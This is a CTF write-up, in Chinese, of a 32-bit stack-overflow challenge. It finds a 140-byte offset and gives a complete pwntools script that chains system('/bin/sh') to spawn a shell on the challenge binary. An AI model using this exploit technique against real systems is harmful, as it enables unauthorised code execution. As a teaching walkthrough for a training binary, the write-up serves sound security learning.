### PWN ROP

checksec一下，32-bit，Stack没有canary
![image.png](https://i.loli.net/2020/04/12/CVw5qsun2IfZOUA.png)

放IDA，代码很简单，看到有read，从标准输入读0x100u(DEC : 256)个字节到buf，存在溢出漏洞
![image.png](https://i.loli.net/2020/04/12/XeUdrxwNpBtMbTm.png)
![image.png](https://i.loli.net/2020/04/12/BTDHMLapnowC4XO.png)

在data找到“/bin/sh”
![image.png](https://i.loli.net/2020/04/12/vzEf6cWhsL2uamC.png)
也有system
![image.png](https://i.loli.net/2020/04/12/lDL5FzEh3ycWYV4.png)

**现在只要制造system("/bin/sh")这个伪栈帧就可以拿到shell了**

### 计算偏移量
![image.png](https://i.loli.net/2020/04/12/4UrDxSac61MREJZ.png)
![image.png](https://i.loli.net/2020/04/12/idyB6sbw5j9qv1t.png)
![image.png](https://i.loli.net/2020/04/12/XGyn6fM17StcxaJ.png)
得到偏移量136+4=140，也可以直接从汇编代码看buf长度

找到"/bin/sh"与system的地址，因为system的地址不是load字段的，所以不能用string找的，而是要去.plt找
![image.png](https://i.loli.net/2020/04/12/VRfJzQiUKIaXc3p.png)
也可以
``` python
    elf = ELF('./ROP')
    sh_addr = elf.search('/bin/sh').next()
    sys_addr = elf.symbols['system']
```
### 编写Exp
``` python
    from pwn import *

    def rop():
        io = process('./ROP')
        #io = remote('111.198.29.45',51308)
        sys_addr=0x8048320
        sh_addr=0x804a024
        #64位的payload的写法是先把参数复制到寄存器里的指令，然后再调用system
        #32位先向栈中压入函数地址再随意压入4个字节再压入函数的参数的地址
        payload = 'a' * 140 + p32(sys_addr) + p32(0) + p32(sh_addr)
        io.sendlineafter('Input:\n',payload)
        io.interactive()

    if __name__ == '__main__':
        rop()
```

### 拿shell
![image.png](https://i.loli.net/2020/04/12/WyHC31vbgE59foq.png)